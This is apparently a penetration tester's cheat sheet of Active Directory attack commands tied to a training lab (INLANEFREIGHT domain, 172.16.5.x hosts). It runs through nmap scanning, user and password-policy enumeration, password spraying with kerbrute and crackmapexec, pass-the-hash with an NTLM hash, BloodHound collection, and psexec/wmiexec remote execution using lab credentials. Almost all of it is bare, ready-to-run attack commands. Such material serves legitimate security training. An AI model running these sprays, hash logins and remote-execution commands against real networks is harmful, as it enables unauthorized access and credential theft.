# Penetration Testing all step

```
https://wadcoms.github.io/
```
---

# Host Reconnaissance

```bash
# Nmap
nmap -p- -Pn -T4 --min-rate 2000 --stats-every 50 --max-retries 2 10.10.10.10 ( Fast Scan )
nmap -p[SPECIFIC PORTS] -A 



```

# Active Directory Enumeration

## Password Policy
```
1) crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol

2) rpcclient -U "" -N 172.16.5.5
getdompwinfo

3) enum4linux -P 172.16.5.5

4) ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

5) C:\htb> net accounts

6) import-module .\PowerView.ps1
Get-DomainPolicy
```

## Enumerate Username
```
https://github.com/insidetrust/statistically-likely-usernames
https://github.com/initstring/linkedin2username

NTLM Relay or Responder

enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

rpcclient -U "" -N 172.16.5.5
enumdomusers

crackmapexec smb 172.16.5.5 --users

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users

```

## Password Spraying
```
# Linux
for u in $(cat wordlist.txt);do rpcclient -U "username%password" -c "getusername;quit" 172.16.5.5 | grep Authority; done

kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1

sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +

sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +


# Windows
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

## Credentialed Enumeration
```
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

rpcclient -U "" -N 172.16.5.5
enumdomusers
user:[administrator] rid:[0x1f4]
queryuser 0x1f4

https://github.com/fortra/impacket/blob/master/examples/wmiexec.py
https://github.com/fortra/impacket/blob/master/examples/psexec.py
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5

https://github.com/ropnop/windapsearch
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

https://github.com/dirkjanm/BloodHound.py
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all


